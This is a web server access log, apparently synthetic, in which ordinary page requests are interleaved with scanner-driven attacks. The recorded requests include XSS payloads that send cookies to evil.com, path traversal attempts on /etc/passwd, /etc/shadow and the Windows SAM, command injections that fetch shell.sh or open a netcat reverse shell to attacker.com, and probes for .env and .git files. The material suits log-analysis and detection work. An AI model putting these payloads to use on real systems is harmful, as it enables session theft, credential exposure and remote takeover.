192.168.1.109 - - [06/May/2026:13:37:33 +0800] "GET /gallery HTTP/1.1" 200 22074 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.46 - - [06/May/2026:00:29:01 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 403 1833 "-" "Wget/1.21.3"
192.168.1.126 - - [06/May/2026:09:40:58 +0800] "GET /contact HTTP/1.1" 200 25328 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.48 - - [06/May/2026:01:06:29 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 403 1702 "-" "Nikto/2.1.6"
203.0.113.47 - - [06/May/2026:00:34:24 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 567 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:01:05:44 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 200 2546 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.46 - - [06/May/2026:00:17:35 +0800] "GET /comment?body=<marquee onstart=alert('XSS')> HTTP/1.1" 403 1989 "-" "Nikto/2.1.6"
203.0.113.48 - - [06/May/2026:01:05:51 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 400 344 "-" "python-requests/2.31.0"
203.0.113.49 - - [06/May/2026:01:23:54 +0800] "GET /profile?name=<svg onload=alert('XSS')> HTTP/1.1" 200 157 "-" "Nikto/2.1.6"
192.168.1.144 - - [06/May/2026:16:38:36 +0800] "GET /api/orders HTTP/1.1" 200 39940 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.46 - - [06/May/2026:01:14:46 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 200 2875 "-" "Wget/1.21.3"
203.0.113.49 - - [06/May/2026:00:29:43 +0800] "GET /feedback?msg=<body onload=alert('XSS')> HTTP/1.1" 200 861 "-" "python-requests/2.31.0"
203.0.113.45 - - [06/May/2026:01:34:35 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 403 969 "-" "Nikto/2.1.6"
203.0.113.46 - - [06/May/2026:01:33:50 +0800] "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1" 400 1309 "-" "Nikto/2.1.6"
203.0.113.49 - - [06/May/2026:00:36:39 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 400 1356 "-" "python-requests/2.31.0"
192.168.1.120 - - [06/May/2026:17:37:20 +0800] "GET /api/products HTTP/1.1" 200 7196 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.48 - - [06/May/2026:01:14:04 +0800] "GET /feedback?msg=<body onload=alert('XSS')> HTTP/1.1" 400 2730 "-" "Wget/1.21.3"
203.0.113.45 - - [06/May/2026:01:08:23 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 200 1842 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:01:14:35 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 200 1002 "-" "curl/7.88.1"
203.0.113.46 - - [06/May/2026:00:26:12 +0800] "GET /profile?bio=<div onclick=alert('XSS')>Click me</div> HTTP/1.1" 400 327 "-" "curl/7.88.1"
203.0.113.49 - - [06/May/2026:00:14:46 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 1257 "-" "Wget/1.21.3"
203.0.113.47 - - [06/May/2026:00:14:13 +0800] "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1" 403 229 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:00:37:52 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 400 2389 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.45 - - [06/May/2026:00:42:47 +0800] "GET /feedback?msg=<body onload=alert('XSS')> HTTP/1.1" 403 1579 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.46 - - [06/May/2026:01:03:28 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 400 1119 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.45 - - [06/May/2026:01:01:25 +0800] "GET /search?q=<img src=x onerror=alert(document.cookie)> HTTP/1.1" 400 2959 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
192.168.1.142 - - [06/May/2026:13:16:01 +0800] "GET /partners HTTP/1.1" 200 12289 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.145 - - [06/May/2026:03:07:03 +0800] "POST /index.html HTTP/1.1" 200 32938 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.115 - - [06/May/2026:16:54:51 +0800] "GET /favicon.ico HTTP/1.1" 200 48830 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.120 - - [05/May/2026:19:16:44 +0800] "GET /js/app.js HTTP/1.1" 200 3350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.108 - - [06/May/2026:11:46:30 +0800] "GET /about.html HTTP/1.1" 200 44681 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.141 - - [05/May/2026:20:01:13 +0800] "GET /partners HTTP/1.1" 200 25086 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.134 - - [06/May/2026:01:22:20 +0800] "GET /api/settings HTTP/1.1" 200 32882 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
203.0.113.53 - - [06/May/2026:02:43:46 +0800] "GET /files?name=../../../var/log/auth.log HTTP/1.1" 404 849 "-" "Nikto/2.1.6"
203.0.113.53 - - [06/May/2026:02:53:35 +0800] "GET /files?name=../../../var/log/auth.log HTTP/1.1" 403 112 "-" "python-requests/2.31.0"
203.0.113.51 - - [06/May/2026:02:22:54 +0800] "GET /load?module=../../../proc/self/environ HTTP/1.1" 403 974 "-" "Wget/1.21.3"
203.0.113.54 - - [06/May/2026:03:03:06 +0800] "GET /download?doc=..\..\..\boot.ini HTTP/1.1" 403 444 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.51 - - [06/May/2026:02:32:24 +0800] "GET /download?file=....//....//....//etc/shadow HTTP/1.1" 403 145 "-" "Wget/1.21.3"
203.0.113.50 - - [06/May/2026:03:06:45 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 400 414 "-" "curl/7.88.1"
203.0.113.50 - - [06/May/2026:03:00:53 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 403 112 "-" "curl/7.88.1"
203.0.113.51 - - [06/May/2026:02:49:31 +0800] "GET /include?page=....\\....\\....\\windows\\system32\\config\\sam HTTP/1.1" 404 892 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.51 - - [06/May/2026:03:07:01 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 400 856 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.50 - - [06/May/2026:03:05:51 +0800] "GET /include?page=....\\....\\....\\windows\\system32\\config\\sam HTTP/1.1" 403 633 "-" "Nikto/2.1.6"
203.0.113.53 - - [06/May/2026:02:13:12 +0800] "GET /include?page=....\\....\\....\\windows\\system32\\config\\sam HTTP/1.1" 403 376 "-" "curl/7.88.1"
203.0.113.52 - - [06/May/2026:02:58:58 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 400 477 "-" "Nikto/2.1.6"
203.0.113.52 - - [06/May/2026:03:00:23 +0800] "GET /read?file=....//....//....//etc/hosts HTTP/1.1" 400 773 "-" "Nikto/2.1.6"
203.0.113.51 - - [06/May/2026:03:09:47 +0800] "GET /include?page=....\\....\\....\\windows\\system32\\config\\sam HTTP/1.1" 400 685 "-" "python-requests/2.31.0"
192.168.1.123 - - [06/May/2026:16:41:44 +0800] "GET /press HTTP/1.1" 200 20365 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.51 - - [06/May/2026:02:58:42 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 400 446 "-" "python-requests/2.31.0"
203.0.113.51 - - [06/May/2026:03:02:50 +0800] "GET /download?doc=..\..\..\boot.ini HTTP/1.1" 404 913 "-" "python-requests/2.31.0"
203.0.113.51 - - [06/May/2026:02:20:57 +0800] "GET /files?name=../../../var/log/auth.log HTTP/1.1" 400 930 "-" "python-requests/2.31.0"
203.0.113.53 - - [06/May/2026:02:16:04 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 404 936 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.51 - - [06/May/2026:02:10:57 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 404 862 "-" "python-requests/2.31.0"
203.0.113.50 - - [06/May/2026:02:48:03 +0800] "GET /download?file=....//....//....//etc/shadow HTTP/1.1" 404 193 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.51 - - [06/May/2026:02:44:12 +0800] "GET /view?template=../../../../etc/nginx/nginx.conf HTTP/1.1" 404 528 "-" "python-requests/2.31.0"
192.168.1.134 - - [06/May/2026:13:28:59 +0800] "GET /index.html HTTP/1.1" 200 6215 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.52 - - [06/May/2026:02:43:32 +0800] "GET /load?module=../../../proc/self/environ HTTP/1.1" 403 799 "-" "python-requests/2.31.0"
203.0.113.53 - - [06/May/2026:02:26:14 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 400 593 "-" "curl/7.88.1"
203.0.113.52 - - [06/May/2026:02:32:23 +0800] "GET /view?template=../../../../etc/nginx/nginx.conf HTTP/1.1" 403 116 "-" "curl/7.88.1"
203.0.113.50 - - [06/May/2026:02:25:16 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 403 636 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.53 - - [06/May/2026:02:10:34 +0800] "GET /load?module=../../../proc/self/environ HTTP/1.1" 400 611 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.51 - - [06/May/2026:03:06:08 +0800] "GET /files?name=../../../var/log/auth.log HTTP/1.1" 403 989 "-" "python-requests/2.31.0"
203.0.113.51 - - [06/May/2026:02:16:53 +0800] "GET /view?template=../../../../etc/nginx/nginx.conf HTTP/1.1" 403 921 "-" "python-requests/2.31.0"
203.0.113.51 - - [06/May/2026:02:38:59 +0800] "GET /download?doc=..\..\..\boot.ini HTTP/1.1" 404 382 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.53 - - [06/May/2026:02:52:42 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 403 208 "-" "python-requests/2.31.0"
203.0.113.52 - - [06/May/2026:02:23:30 +0800] "GET /download?file=....//....//....//etc/shadow HTTP/1.1" 400 748 "-" "Wget/1.21.3"
203.0.113.50 - - [06/May/2026:02:10:13 +0800] "GET /files?path=../../../etc/passwd HTTP/1.1" 400 811 "-" "curl/7.88.1"
203.0.113.52 - - [06/May/2026:02:19:26 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 404 930 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.50 - - [06/May/2026:02:22:24 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 400 133 "-" "Nikto/2.1.6"
203.0.113.50 - - [06/May/2026:03:03:13 +0800] "GET /view?template=../../../../etc/nginx/nginx.conf HTTP/1.1" 400 565 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.54 - - [06/May/2026:02:37:45 +0800] "GET /read?file=....//....//....//etc/hosts HTTP/1.1" 403 146 "-" "curl/7.88.1"
203.0.113.54 - - [06/May/2026:02:27:57 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 403 704 "-" "Nikto/2.1.6"
203.0.113.52 - - [06/May/2026:02:38:26 +0800] "GET /download?doc=..\..\..\boot.ini HTTP/1.1" 404 199 "-" "Wget/1.21.3"
203.0.113.50 - - [06/May/2026:03:09:18 +0800] "GET /api/file?path=/etc/passwd%00.jpg HTTP/1.1" 400 372 "-" "curl/7.88.1"
203.0.113.52 - - [06/May/2026:02:45:13 +0800] "GET /include?page=....\\....\\....\\windows\\system32\\config\\sam HTTP/1.1" 404 577 "-" "curl/7.88.1"
192.168.1.100 - - [05/May/2026:20:12:42 +0800] "GET /api/orders HTTP/1.1" 200 1224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.145 - - [06/May/2026:09:55:20 +0800] "GET /js/app.js HTTP/1.1" 200 21838 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.137 - - [06/May/2026:07:08:42 +0800] "GET /resources HTTP/1.1" 200 38527 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.148 - - [06/May/2026:08:32:26 +0800] "GET /support HTTP/1.1" 200 15272 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.141 - - [06/May/2026:12:16:58 +0800] "GET /blog HTTP/1.1" 200 8951 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.127 - - [06/May/2026:01:12:23 +0800] "GET /favicon.ico HTTP/1.1" 200 23937 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.116 - - [06/May/2026:07:45:01 +0800] "GET /css/style.css HTTP/1.1" 200 41886 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.127 - - [06/May/2026:07:30:32 +0800] "GET /docs/api HTTP/1.1" 200 1382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.125 - - [06/May/2026:08:07:27 +0800] "GET /contact HTTP/1.1" 200 25926 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.149 - - [06/May/2026:15:17:29 +0800] "GET /blog HTTP/1.1" 200 37361 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.56 - - [06/May/2026:04:45:59 +0800] "GET /lookup?host=localhost;wget http://evil.com/shell.sh HTTP/1.1" 500 1467 "-" "curl/7.88.1"
192.168.1.146 - - [06/May/2026:13:05:08 +0800] "GET /services HTTP/1.1" 200 41737 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.57 - - [06/May/2026:04:50:51 +0800] "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 403 969 "-" "Wget/1.21.3"
192.168.1.124 - - [06/May/2026:14:42:17 +0800] "GET /partners HTTP/1.1" 200 15966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.58 - - [06/May/2026:04:12:49 +0800] "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 400 1699 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.58 - - [06/May/2026:04:19:16 +0800] "GET /ping?addr=8.8.4.4&echo hacked > /tmp/pwned HTTP/1.1" 500 975 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.59 - - [06/May/2026:04:15:01 +0800] "GET /api/exec?cmd=test`id` HTTP/1.1" 400 1972 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.58 - - [06/May/2026:04:43:46 +0800] "GET /ping?ip=8.8.8.8&&net user HTTP/1.1" 403 1164 "-" "Nikto/2.1.6"
203.0.113.59 - - [06/May/2026:04:11:42 +0800] "GET /tools/traceroute?target=example.com||ls -la HTTP/1.1" 500 1012 "-" "python-requests/2.31.0"
203.0.113.58 - - [06/May/2026:04:49:10 +0800] "GET /api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash HTTP/1.1" 403 966 "-" "Wget/1.21.3"
203.0.113.59 - - [06/May/2026:04:38:47 +0800] "GET /api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash HTTP/1.1" 403 1607 "-" "curl/7.88.1"
192.168.1.110 - - [06/May/2026:02:36:33 +0800] "GET /resources HTTP/1.1" 200 44674 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.56 - - [06/May/2026:04:38:42 +0800] "GET /lookup?host=localhost;wget http://evil.com/shell.sh HTTP/1.1" 400 1952 "-" "python-requests/2.31.0"
203.0.113.55 - - [06/May/2026:04:24:50 +0800] "GET /api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash HTTP/1.1" 400 1253 "-" "Nikto/2.1.6"
203.0.113.58 - - [06/May/2026:04:22:57 +0800] "GET /ping?ip=8.8.8.8&&net user HTTP/1.1" 500 338 "-" "python-requests/2.31.0"
192.168.1.119 - - [05/May/2026:18:11:51 +0800] "GET /images/logo.png HTTP/1.1" 200 17312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.59 - - [06/May/2026:04:26:19 +0800] "GET /tools/traceroute?target=example.com||ls -la HTTP/1.1" 400 530 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.56 - - [06/May/2026:04:27:29 +0800] "GET /ping?addr=8.8.4.4&echo hacked > /tmp/pwned HTTP/1.1" 400 905 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.55 - - [06/May/2026:04:42:48 +0800] "GET /ping?addr=8.8.4.4&echo hacked > /tmp/pwned HTTP/1.1" 400 473 "-" "python-requests/2.31.0"
203.0.113.55 - - [06/May/2026:04:52:17 +0800] "GET /tools/traceroute?target=example.com||ls -la HTTP/1.1" 403 1557 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.58 - - [06/May/2026:04:36:26 +0800] "GET /lookup?host=localhost;wget http://evil.com/shell.sh HTTP/1.1" 403 1057 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.57 - - [06/May/2026:04:25:17 +0800] "GET /api/dns?query=google.com$(cat /etc/shadow) HTTP/1.1" 400 293 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.55 - - [06/May/2026:04:18:18 +0800] "GET /ping?ip=8.8.8.8&&net user HTTP/1.1" 400 412 "-" "Wget/1.21.3"
203.0.113.58 - - [06/May/2026:04:47:41 +0800] "GET /api/exec?cmd=test`id` HTTP/1.1" 500 158 "-" "python-requests/2.31.0"
203.0.113.58 - - [06/May/2026:04:14:09 +0800] "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 400 1693 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.56 - - [06/May/2026:04:39:08 +0800] "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 403 1928 "-" "Wget/1.21.3"
203.0.113.59 - - [06/May/2026:04:49:25 +0800] "GET /tools/traceroute?target=example.com||ls -la HTTP/1.1" 500 139 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.56 - - [06/May/2026:04:31:56 +0800] "GET /api/dns?query=google.com$(cat /etc/shadow) HTTP/1.1" 400 491 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.57 - - [06/May/2026:04:25:47 +0800] "GET /api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash HTTP/1.1" 400 743 "-" "python-requests/2.31.0"
203.0.113.55 - - [06/May/2026:04:13:26 +0800] "GET /ping?addr=8.8.4.4&echo hacked > /tmp/pwned HTTP/1.1" 500 1287 "-" "Nikto/2.1.6"
203.0.113.58 - - [06/May/2026:04:52:05 +0800] "GET /api/trace?ip=127.0.0.1|nc attacker.com 4444 -e /bin/bash HTTP/1.1" 500 1574 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.58 - - [06/May/2026:04:40:42 +0800] "GET /lookup?domain=example.com|whoami HTTP/1.1" 403 919 "-" "Wget/1.21.3"
203.0.113.58 - - [06/May/2026:04:10:29 +0800] "GET /ping?addr=8.8.4.4&echo hacked > /tmp/pwned HTTP/1.1" 500 1216 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.58 - - [06/May/2026:04:13:07 +0800] "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 400 591 "-" "python-requests/2.31.0"
192.168.1.130 - - [06/May/2026:18:05:42 +0800] "GET /events HTTP/1.1" 200 8897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.109 - - [06/May/2026:02:42:03 +0800] "GET /css/style.css HTTP/1.1" 200 47590 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.132 - - [06/May/2026:04:18:41 +0800] "GET /gallery HTTP/1.1" 200 7969 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.102 - - [06/May/2026:17:06:41 +0800] "GET /terms HTTP/1.1" 200 44267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.140 - - [05/May/2026:20:52:20 +0800] "GET /api/orders HTTP/1.1" 200 1482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.109 - - [06/May/2026:17:35:37 +0800] "GET /press HTTP/1.1" 200 26684 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.117 - - [06/May/2026:11:09:30 +0800] "GET /contact HTTP/1.1" 200 9632 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.116 - - [06/May/2026:02:36:59 +0800] "GET /terms HTTP/1.1" 200 32429 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.140 - - [05/May/2026:21:18:48 +0800] "GET /api/users HTTP/1.1" 200 11895 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.132 - - [05/May/2026:21:49:24 +0800] "GET /gallery HTTP/1.1" 200 46384 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.136 - - [06/May/2026:04:27:27 +0800] "POST /news HTTP/1.1" 200 18802 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
172.16.0.17 - - [06/May/2026:06:16:43 +0800] "GET /server-status HTTP/1.1" 500 1677 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.26 - - [06/May/2026:06:32:02 +0800] "GET /debug HTTP/1.1" 200 1894 "-" "Wget/1.21.3"
172.16.0.29 - - [06/May/2026:06:15:05 +0800] "GET /manager HTTP/1.1" 403 3889 "-" "Nikto/2.1.6"
172.16.0.18 - - [06/May/2026:06:18:57 +0800] "GET /server-info HTTP/1.1" 200 4078 "-" "python-requests/2.31.0"
172.16.0.13 - - [06/May/2026:06:16:20 +0800] "GET /wp-admin HTTP/1.1" 301 4654 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.21 - - [06/May/2026:06:37:15 +0800] "GET /api/v2/admin HTTP/1.1" 404 4050 "-" "Nikto/2.1.6"
172.16.0.12 - - [06/May/2026:06:39:56 +0800] "GET /phpmyadmin HTTP/1.1" 301 1148 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.28 - - [06/May/2026:06:15:34 +0800] "GET /phpmyadmin HTTP/1.1" 404 1247 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.13 - - [06/May/2026:06:10:54 +0800] "GET /phpmyadmin HTTP/1.1" 301 4769 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.26 - - [06/May/2026:06:12:29 +0800] "GET /settings.json HTTP/1.1" 404 4758 "-" "curl/7.88.1"
172.16.0.24 - - [06/May/2026:06:19:50 +0800] "GET /backup.sql HTTP/1.1" 200 807 "-" "Wget/1.21.3"
172.16.0.22 - - [06/May/2026:06:27:07 +0800] "GET /test HTTP/1.1" 403 4995 "-" "Wget/1.21.3"
172.16.0.21 - - [06/May/2026:06:21:53 +0800] "GET /.git/config HTTP/1.1" 200 628 "-" "python-requests/2.31.0"
172.16.0.24 - - [06/May/2026:06:12:45 +0800] "GET /sitemap.xml HTTP/1.1" 301 1756 "-" "curl/7.88.1"
172.16.0.16 - - [06/May/2026:06:13:39 +0800] "GET /.env HTTP/1.1" 200 337 "-" "Wget/1.21.3"
172.16.0.28 - - [06/May/2026:06:33:01 +0800] "GET /db HTTP/1.1" 301 43 "-" "Wget/1.21.3"
172.16.0.12 - - [06/May/2026:06:20:43 +0800] "GET /swagger.json HTTP/1.1" 301 591 "-" "Nikto/2.1.6"
172.16.0.23 - - [06/May/2026:06:15:24 +0800] "GET /wp-login.php HTTP/1.1" 404 1195 "-" "Wget/1.21.3"
172.16.0.22 - - [06/May/2026:06:38:36 +0800] "GET /debug HTTP/1.1" 301 4794 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.25 - - [06/May/2026:06:38:49 +0800] "GET /db.sql HTTP/1.1" 301 3832 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.17 - - [06/May/2026:06:11:24 +0800] "GET /graphql HTTP/1.1" 403 1645 "-" "Nikto/2.1.6"
172.16.0.11 - - [06/May/2026:06:31:58 +0800] "GET /.DS_Store HTTP/1.1" 200 2414 "-" "curl/7.88.1"
172.16.0.18 - - [06/May/2026:06:18:24 +0800] "GET /phpmyadmin HTTP/1.1" 404 808 "-" "curl/7.88.1"
172.16.0.24 - - [06/May/2026:06:39:08 +0800] "GET /.git/config HTTP/1.1" 403 3315 "-" "curl/7.88.1"
172.16.0.10 - - [06/May/2026:06:31:30 +0800] "GET /server-status HTTP/1.1" 403 2121 "-" "python-requests/2.31.0"
172.16.0.21 - - [06/May/2026:06:17:49 +0800] "GET /graphql HTTP/1.1" 403 2465 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
192.168.1.113 - - [06/May/2026:13:53:55 +0800] "GET /api/settings HTTP/1.1" 200 24401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
